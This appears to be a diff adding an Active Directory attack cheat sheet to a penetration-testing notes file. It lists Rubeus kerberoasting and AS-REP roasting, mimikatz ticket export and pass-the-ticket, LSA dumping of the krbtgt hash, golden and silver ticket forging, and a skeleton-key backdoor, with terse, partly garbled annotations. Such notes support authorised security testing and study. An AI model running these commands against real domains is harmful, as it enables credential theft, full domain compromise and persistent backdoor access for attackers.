@@ -46,3 +46,29 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 ```
 lsadump::dcsync /user:krbtgt
 ```
+
+Kerberoast
+```
+Rubeus.exe kerberoast
+Rubeus.exe asreproast
+
+dumps tickets containing the hashes hashes for all accounts:
+
+sekurlsa::tickets /export
+
+Impersonate their tickets
+
+kerberos::ptt <ticket>
+
+This will the hash and security identifier needed to create a golden ticket.
+
+lsadump::lsa /inject /name:username
+
+Generating the golden/silver ticket:
+
+Kerberos::golden /user:<username> /domain:controller.local /sid:<SID> /krbtgt:<NTLM> /id:<ID>
+
+Create a backdoor
+
+misc::skeleton
+```
